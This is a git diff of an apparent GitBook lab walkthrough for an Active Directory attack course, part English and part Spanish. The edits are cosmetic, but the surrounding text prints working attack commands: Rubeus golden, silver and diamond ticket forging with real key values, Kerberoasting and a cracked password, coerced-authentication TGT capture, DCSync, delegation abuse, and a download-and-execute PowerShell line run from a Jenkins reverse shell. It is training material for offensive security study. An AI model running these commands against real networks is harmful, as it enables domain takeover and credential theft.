@@ -73,17 +73,17 @@ C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-g
 
 > In us vm student console/machine
 
-<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (8) (1).png" alt="" width="509"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (45).png" alt="" width="509"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
 
 Now, It generete us a complete command to forge a Golden ticket.
 
 `C:\AD\Tools\Loader.exe Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3247 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD`
 
-> Remember to add `-path C:\AD\Tools\Rubeus.exe -args` after `Loader.exe` and `/ptt` at the end of the generated command to inject it in the current process.&#x20;
+> Remember to add `-path C:\AD\Tools\Rubeus.exe -args` after `Loader.exe` and `/ptt` at the end of the generated command to inject it in the current process.
 
 > We need modificate a little bit the commands awarded by the previus commnad -->
 >
@@ -93,8 +93,9 @@ Now, It generete us a complete command to forge a Golden ticket.
 >
 > between -->
 >
-> <pre><code>C:\AD\Tools\Loader.exe <a data-footnote-ref href="#user-content-fn-1">-path C:\AD\Tools\Rubeus.exe -args </a>Evasive-Golden .....
-> </code></pre>
+> ```
+> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden .....
+> ```
 
 Once the ticket is injected, we can access resources in the domain:
 
@@ -102,13 +103,13 @@ Once the ticket is injected, we can access resources in the domain:
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3046 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
 
 ```
 winrs -r:dcorp-dc cmd
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -116,7 +117,7 @@ winrs -r:dcorp-dc cmd
 
 > Note that we are NOT using the krbtgt hash here. Using the below command, we can create a Silver Ticket that provides us access to the HTTP service (WinRM) on DC.
 >
-> Please note that the hash of `dcorp-dc$` (RC4 in the below command) may be different in your lab instance.&#x20;
+> Please note that the hash of `dcorp-dc$` (RC4 in the below command) may be different in your lab instance.
 >
 > We can obtaine RC4 hash from dcorp-dc$ like-->
 >
@@ -138,7 +139,7 @@ You can also use aes256 keys in place of NTLM hash:
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
 ```
 
-<figure><img src="../../.gitbook/assets/image (561).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1433).png" alt=""><figcaption></figcaption></figure>
 
 #### Verify it
 
@@ -148,18 +149,18 @@ We can check if we got the correct service ticket:
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
 ```
 
-<figure><img src="../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1434).png" alt=""><figcaption></figcaption></figure>
 
 We have the HTTP service ticket for `dcorp-dc`, let’s try accessing it using `winrs`. Note that we are using FQDN of `dcorp-dc` as that is what the service ticket has:
 
-<figure><img src="../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1436).png" alt=""><figcaption></figcaption></figure>
 
 ### WMI Service
 
-For accessing WMI, we need to create two tickets&#x20;
+For accessing WMI, we need to create two tickets
 
-* &#x20;one for **HOST** service&#x20;
-* another for **RPCSS**.&#x20;
+* one for **HOST** service
+* another for **RPCSS**.
 
 Run the below commands from an elevated shell:
 
@@ -189,7 +190,7 @@ Check if the tickets are present.
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
 ```
 
-<figure><img src="../../.gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1435).png" alt=""><figcaption></figcaption></figure>
 
 Now, try running WMI commands on the domain controller:
 
@@ -198,15 +199,15 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
 ```
 
-<figure><img src="../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1442).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## Diamond Ticket
 
-We can simply use the following Rubeus command to execute the attack.&#x20;
+We can simply use the following Rubeus command to execute the attack.
 
-> Note that the command needs to be run from an elevated shell (Run as administrator).&#x20;
+> Note that the command needs to be run from an elevated shell (Run as administrator).
 >
 > We take the usual OPSEC care of using Loader:
 
@@ -227,7 +228,7 @@ winrs -r:dcorp-dc cmd
 set username
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -254,7 +255,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
 ```
 
-<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 #### Check It
 
@@ -273,7 +274,7 @@ Version         : 10.0.20348
 
 ### Option 2 – Enable PowerShell Remoting for student453
 
-Similar modification can be done to PowerShell remoting configuration. (In rare cases, you may get an I/O error while using the below command, please ignore it).&#x20;
+Similar modification can be done to PowerShell remoting configuration. (In rare cases, you may get an I/O error while using the below command, please ignore it).
 
 > **Please note that this is unstable since some patches in August 2020**:
 
@@ -328,7 +329,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-DomainUser -SPN
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 The `svcadmin`, which is a domain administrator has a SPN set! Let’s Kerberoast it!
 
@@ -383,15 +384,15 @@ We can now use John the Ripper to brute-force the hashes.
 
 > Please note that you need to remove “**:1433**” from the SPN in hashes.txt before running John
 >
-> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*`&#x20;
+> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*`
 >
-> should be&#x20;
+> should be
 >
-> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*`&#x20;
+> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*`
 >
 > in hashes.txt
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
 Run the below command after making above changes:
 
@@ -410,7 +411,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
 
 `svcadmin:*ThisisBlasphemyThisisMadness!!`
 
@@ -428,17 +429,17 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-DomainComputer -Unconstrained | select -ExpandProperty name
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
-Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.&#x20;
+Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.
 
-> Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv.&#x20;
+> Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv.
 
 Let’s check if anyone of them have local admin privileges on dcorp-appsrv.
 
 ### Check local admins in dcorp-appsrv
 
-> To that, we will need to check all users and hashes previusly obtained&#x20;
+> To that, we will need to check all users and hashes previusly obtained
 >
 > Like for example appadmin
 
@@ -487,7 +488,7 @@ C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenad
 >
 > > Remember upload too the Rubeus to us webserver
 > >
-> > ![](<../../.gitbook/assets/image (5) (1).png>)
+> > <img src="../../.gitbook/assets/image (42).png" alt="" data-size="original">
 
 Execute Rubeus
 
@@ -532,7 +533,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args DCORP-DC DCORP-APPS
 C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
 ```
 
-### Optain the TGT&#x20;
+### Optain the TGT
 
 After execute some of these options, on the Rubeus listener (dcorp-appsrv), we can see the TGT of dcorp-dc$:
 
@@ -553,9 +554,9 @@ After execute some of these options, on the Rubeus listener (dcorp-appsrv), we c
 [snip]
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
 
-<mark style="background-color:yellow;">Copy the base64 encoded ticket and use it with Rubeus on student VM.</mark>&#x20;
+<mark style="background-color:yellow;">Copy the base64 encoded ticket and use it with Rubeus on student VM.</mark>
 
 ### Importar the ticket and do DCSync (Domain Admin)
 
@@ -610,7 +611,7 @@ Great!
 
 ### Escalada a Enterprise Admin (repetición contra mcorp-dc)
 
-To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`.&#x20;
+To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`.
 
 > Repite los mismos pasos pero ahora contra mcorp-dc$:
 
@@ -694,7 +695,7 @@ C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
 Get-DomainUser -TrustedToAuth
 ```
 
-<figure><img src="../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1441).png" alt=""><figcaption></figcaption></figure>
 
 > websvc → Tiene Constrained Delegation hacia CIFS/dcorp-mssql.dollarcorp.moneycorp.local
 
@@ -707,7 +708,7 @@ In the below command, we request a TGS for websvc as the Domain Administrator - 
 > * Pide un TGT para websvc
 > * Hace **S4U2Self** → se hace pasar por Administrator
 > * Hace **S4U2Proxy** → obtiene un ticket para el servicio CIFS en dcorp-mssql
-> * Usa /msdsspn para especifcar el path&#x20;
+> * Usa /msdsspn para especifcar el path
 > * Inyecta el ticket con /ptt
 
 ```
@@ -902,7 +903,7 @@ Credentials:
 
 ## Resource-Based Constrained Delegation
 
-Let’s use PowerView from a PowerShell session started using Invisi-Shell to enumerate Write permissions for a user that we have compromised.&#x20;
+Let’s use PowerView from a PowerShell session started using Invisi-Shell to enumerate Write permissions for a user that we have compromised.
 
 ```
 C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
@@ -911,10 +912,11 @@ C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
 
 After trying from multiple users or using BloodHound we would know <mark style="background-color:yellow;">that the user ciadmin has Write permissions on the computer object of dcorp-mgmt</mark>:
 
-<pre><code>C:\AD\Tools> Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+```
+C:\AD\Tools> Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 
 ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
-<a data-footnote-ref href="#user-content-fn-1">AceQualifier            : AccessAllowed</a>
+AceQualifier            : AccessAllowed
 ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
 ObjectAceType           : None
 AceFlags                : None
@@ -925,11 +927,11 @@ IdentityReferenceName   : ciadmin
 IdentityReferenceDomain : dollarcorp.moneycorp.local
 IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
 IdentityReferenceClass  : user
-</code></pre>
+```
 
-> Recall that we compromised ciadmin from dcorp-ci.&#x20;
+> Recall that we compromised ciadmin from dcorp-ci.
 
-We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci.&#x20;
+We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci.
 
 Let’s use the reverse shell (Jenkins) that we have and load PowerView there:
 
@@ -947,7 +949,7 @@ PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NE
 PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')
 ```
 
-Now, configure RBCD on dcorp-mgmt for the student VMs.&#x20;
+Now, configure RBCD on dcorp-mgmt for the student VMs.
 
 You may like to set it for all the student VMs in your lab instance so that your fellow students can also abuse RBCD:
 
@@ -1044,5 +1046,3 @@ C:\Users\Administrator.dcorp> set computername
 Set computername
 COMPUTERNAME=dcorp-mgmt
 ```
-
-[^1]: 
